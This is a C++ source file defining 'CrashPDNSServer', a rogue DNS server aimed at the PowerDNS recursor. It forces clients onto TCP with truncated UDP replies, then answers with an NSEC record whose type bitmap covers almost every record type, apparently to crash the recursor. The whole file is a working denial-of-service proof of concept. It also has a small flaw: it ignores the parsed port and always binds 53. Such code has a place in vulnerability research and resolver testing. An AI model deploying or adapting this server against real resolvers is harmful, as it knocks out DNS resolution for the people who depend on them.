#include "dns_server.hpp"
#include <boost/program_options.hpp>
#include <iostream>

const int   TTL          = 10;
const char *BIND_ADDRESS = "0.0.0.0";

class CrashPDNSServer : public dns::DNSServer
{
public:
    CrashPDNSServer( const std::string &addr, uint16_t port )
        : dns::DNSServer( addr, port )
    {
        // skip A record
        for ( uint16_t type = 2 ; type < 0xffff ; type++ ) {
            mBitmap.add( type );
        }
    }

    dns::PacketInfo generateResponse( const dns::PacketInfo &query, bool via_tcp )
    {
        dns::PacketInfo           response;
        dns::QuestionSectionEntry query_question = query.question_section[ 0 ];

        dns::QuestionSectionEntry question1;
        question1.q_domainname = query_question.q_domainname;
        question1.q_type       = query_question.q_type;
        question1.q_class      = query_question.q_class;
        response.question_section.push_back( question1 );

        if ( ! via_tcp ) {
            response.id                   = query.id;
            response.opcode               = 0;
            response.query_response       = 1;
            response.authoritative_answer = 1;
            response.truncation           = 1;
            response.recursion_desired    = 0;
            response.recursion_available  = 0;
            response.zero_field           = 0;
            response.authentic_data       = 1;
            response.checking_disabled    = 1;
            response.response_code        = dns::NO_ERROR;

            return response;
        }

        dns::ResourceRecord answer;
        dns::Domainname next_name = query_question.q_domainname;
        next_name.addSubdomain( "a" );

        answer.r_domainname = query_question.q_domainname;
        answer.r_type       = dns::TYPE_NSEC;
        answer.r_class      = dns::CLASS_IN;
        answer.r_ttl        = TTL;
        answer.r_resource_data =
            dns::RDATAPtr( new dns::RecordNSEC( next_name, mBitmap ) );
        response.answer_section.push_back( answer );

        response.id                   = query.id;
        response.opcode               = 0;
        response.query_response       = 1;
        response.authoritative_answer = 1;
        response.truncation           = 0;
        response.recursion_desired    = 0;
        response.recursion_available  = 0;
        response.zero_field           = 0;
        response.authentic_data       = 1;
        response.checking_disabled    = 1;
        response.response_code        = dns::NO_ERROR;

        return response;
    }

private:
    dns::NSECBitmapField mBitmap;
};

int main( int argc, char **argv )
{
    namespace po = boost::program_options;

    std::string bind_address;
    uint16_t    bind_port;

    po::options_description desc( "for pdns recursor" );
    desc.add_options()( "help,h", "print this message" )
        ( "bind,b", po::value<std::string>( &bind_address )->default_value( BIND_ADDRESS ), "bind address" )
        ( "port,p", po::value<uint16_t>( &bind_port )->default_value( 53 ), "bind port" )
        ;

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    CrashPDNSServer server( bind_address, 53 );
    server.start();

    return 0;
}
